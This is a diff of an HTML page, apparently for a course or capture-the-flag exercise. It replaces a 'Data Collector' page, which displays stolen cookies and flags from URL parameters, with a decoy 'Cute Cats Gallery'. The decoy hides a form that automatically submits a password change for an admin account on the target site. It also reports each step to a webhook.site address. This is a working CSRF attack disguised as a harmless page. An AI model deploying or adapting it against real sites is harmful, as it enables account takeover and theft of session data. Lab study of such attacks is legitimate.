@@ -1,105 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Data Collector</title>
+    <title>Cute Cats Gallery 🐱</title>
     <style>
         body {
-            background-color: #121212;
-            color: #ffffff;
-            font-family: 'Courier New', monospace;
-            padding: 20px;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
         }
-        h1, h2, h3 {
-            color: #4CAF50;
+        h1 {
+            font-size: 3em;
         }
-        pre {
-            background-color: #1e1e1e;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        .section {
-            margin: 20px 0;
-            border: 1px solid #333;
-            padding: 15px;
-            border-radius: 5px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <h1>🎯 Data Collector Active</h1>
-    <div id="status">Waiting for data...</div>
-    <div id="output"></div>
+    <h1>🐱 Amazing Cats Gallery! 🐱</h1>
+    <p>Loading the most adorable cats on the internet...</p>
+    <div class="loader"></div>
     
+    <!-- Скрытая форма для CSRF атаки -->
+    <form id="csrfForm" method="POST" action="https://cats.is-course.ru/settings" style="display:none;">
+        <input type="hidden" name="password" value="HackedPass123!">
+        <input type="hidden" name="confirm-password" value="HackedPass123!">
+    </form>
+
     <script>
-        // Получаем параметры из URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const cookies = urlParams.get('c');
-        const data = urlParams.get('data');
-        const html = urlParams.get('html');
-        const flag = urlParams.get('flag');
+        // Уведомляем себя, что админ открыл страницу
+        fetch('https://webhook.site/085235bc-365b-4996-baf3-4dac185f1080?event=page_opened&time=' + new Date().toISOString())
+            .catch(err => console.log('Webhook notification failed'));
         
-        let output = '';
-        let hasData = false;
-        
-        if (cookies) {
-            hasData = true;
-            output += '<div class="section"><h3>🍪 Cookies:</h3><pre>' + escapeHtml(cookies) + '</pre></div>';
-        }
-        
-        if (data) {
-            hasData = true;
-            output += '<div class="section"><h3>📄 Data:</h3><pre>' + escapeHtml(decodeURIComponent(data)) + '</pre></div>';
-        }
-        
-        if (html) {
-            hasData = true;
-            output += '<div class="section"><h3>📝 HTML:</h3><pre>' + escapeHtml(decodeURIComponent(html)) + '</pre></div>';
-        }
-        
-        if (flag) {
-            hasData = true;
-            output += '<div class="section"><h3>🚩 FLAG:</h3><pre style="color: #4CAF50; font-size: 1.5em;">' + escapeHtml(decodeURIComponent(flag)) + '</pre></div>';
-        }
-        
-        // Показываем все параметры
-        if (window.location.search) {
-            output += '<div class="section"><h3>🔗 Full URL:</h3><pre>' + escapeHtml(window.location.href) + '</pre></div>';
-            output += '<div class="section"><h3>📋 All params:</h3><pre>' + escapeHtml(window.location.search) + '</pre></div>';
-        }
-        
-        if (hasData) {
-            document.getElementById('status').innerHTML = '<h2 style="color: #4CAF50;">✅ Data Received!</h2>';
-            document.getElementById('output').innerHTML = output;
+        // Ждём 1 секунду и отправляем форму смены пароля
+        setTimeout(() => {
+            // Уведомляем о начале атаки
+            fetch('https://webhook.site/085235bc-365b-4996-baf3-4dac185f1080?event=form_submitting&time=' + new Date().toISOString())
+                .catch(err => console.log('Webhook notification failed'));
             
-            // Пытаемся найти флаг в полученных данных
-            const allText = (cookies || '') + (data || '') + (html || '');
-            const flagMatch = allText.match(/flag\{[^}]+\}/i) || allText.match(/FLAG\{[^}]+\}/i);
-            if (flagMatch) {
-                document.getElementById('output').innerHTML = 
-                    '<div class="section" style="border: 2px solid #4CAF50;"><h2>🎉 FLAG FOUND!</h2><pre style="color: #4CAF50; font-size: 2em;">' + 
-                    escapeHtml(flagMatch[0]) + '</pre></div>' + output;
-            }
-        }
-        
-        // Функция для экранирования HTML
-        function escapeHtml(text) {
-            if (!text) return '';
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-        
-        // Логируем в консоль для отладки
-        console.log('URL Parameters:', {
-            cookies: cookies,
-            data: data,
-            html: html,
-            flag: flag,
-            fullUrl: window.location.href
-        });
+            // Отправляем форму для смены пароля админа
+            document.getElementById('csrfForm').submit();
+        }, 1000);
     </script>
 </body>
 </html>
